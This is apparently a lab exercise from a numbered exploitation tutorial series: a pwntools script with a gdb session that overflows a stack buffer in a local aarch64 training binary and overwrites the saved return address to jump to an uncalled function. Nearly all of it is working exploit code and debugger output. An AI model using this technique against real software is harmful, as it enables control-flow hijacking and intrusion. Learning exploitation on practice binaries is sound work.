#!/usr/bin/python

"""
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400734 <+0>:	stp	x29, x30, [sp, #-32]!
...
   0x000000000040074c <+24>:	ldp	x29, x30, [sp], #32
   0x0000000000400750 <+28>:	ret
End of assembler dump.
(gdb) b vulnerable 
(gdb) b *0x000000000040074c
Breakpoint 2 at 0x40074c: file src/02-overwrite-ret.c, line 22.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:11
11		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd30 ""
(gdb) c
Continuing.

Breakpoint 2, main (argc=1, argv=0x40007fff08) at src/02-overwrite-ret.c:22
22	}
(gdb) i r  $sp
sp             0x40007ffdb0	0x40007ffdb0
"""

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/02-overwrite-ret'

saved_x30_addr = 0x40007ffdb0 + 8
buffer_addr = 0x40007ffd30

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
